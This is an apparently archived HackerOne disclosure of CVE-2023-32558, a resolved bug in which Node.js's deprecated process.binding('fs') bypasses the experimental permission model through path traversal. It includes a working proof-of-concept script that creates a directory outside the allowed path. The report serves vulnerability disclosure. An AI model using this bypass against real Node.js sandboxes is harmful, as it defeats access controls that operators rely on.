---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2023-09-10
submitted: 2023-07-05T15:54:29.775Z
bounty_usd: null
votes: 8
cve: "CVE-2023-32558"
program: "[[programs/nodejs|Node.js]]"
reporter: "rafaelgss"
source: "https://hackerone.com/reports/2051257"
title: "process.binding() can bypass the permission model through path traversal"
---
# process.binding() can bypass the permission model through path traversal

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Node.js | **Disclosed:** 2023-09-10

- Report: [https://hackerone.com/reports/2051257](https://hackerone.com/reports/2051257)
- CWE: Path Traversal | CVE: CVE-2023-32558
- Submitted: 2023-07-05T15:54:29.775Z

## Report summary

The use of the deprecated API `process.binding()` can bypass the permission model through path traversal. 

This vulnerability affects all users using the experimental permission model in Node.js 20.x.

Please note that at the time this CVE was issued, the permission model is an experimental feature of Node.js.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** process.binding('fs') bypassed the permission model validation against path traversal

**Description:** process.binding('fs') can be used to bypass the path traversal validation for the permisison model

## Steps To Reproduce:

Create the following index.js and store at `/home/pathtraversal/`
```js
// index.js
const fs = process.binding('fs')

fs.mkdir('/home/pathtraversal/../test0', 511, false, null, null)
```

```console
$ pwd
/home/pathtraversal/
$ node --experimental-permission --allow-fs-read="/home/pathtraversal/*" --allow-fs-write="/home/pathtraversal/*" index.js
```

`/home/test0` will be created bypassing the permission model validation

## Impact

All the methods exposed by the process.binding('fs') could eventually bypass the permission model using path traversal. It will require the attacker to read the node_file.cc implementation, but that's trivial.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Cve Id Added**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
